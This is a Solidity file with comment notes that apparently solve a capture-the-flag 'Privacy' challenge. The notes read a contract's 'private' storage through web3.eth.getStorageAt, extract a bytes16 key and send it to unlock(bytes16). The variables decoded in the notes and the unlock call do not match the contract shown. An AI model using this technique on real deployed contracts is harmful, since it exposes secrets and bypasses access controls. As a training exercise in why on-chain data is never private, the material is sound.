pragma solidity ^0.4.15;


contract Privacy {

    bytes32[3] private data;

    function Privacy() public {
        data[0] = "123";
        data[1] = "456";
        data[2] = "789abcdeftghikiamdaaeqwweqsdca";
    }

    function x() public view returns (bytes16) {
        return bytes16(data[2]);
        // x -> 0x373839616263646566746768696b6961
    }
}

/*
https://medium.com/aigang-network/how-to-read-ethereum-contract-storage-44252c8af925

web3.eth.getStorageAt(contract.address, 0, (x, y) => { alert(0 + " - " + y)})
0 - 0x000000000000000000000000000000000000000000000000000000904bff0a00

0 - 0x000000000000000000000000000000000000000000000000000000
904b -> awkwardness
ff -> flattening
0a -> denomination
01 -> locked

index 1 -> 3: bytes32[3] private data;

web3.eth.getStorageAt(contractAddress, 3, (x, y) => { alert(3 + " - " + y)})
// 3 - 0xf5365a29f4ffa737d6fc55e8f7dd8b3c55936a11b271ff1c7dfb80ef8985e18c
-> t = 0xf5365a29f4ffa737d6fc55e8f7dd8b3c = bytes16(data[2])

s = web3.sha3("unlock(bytes16)").slice(0, 10)
await contract.sendTransaction({data: s + t });
*/
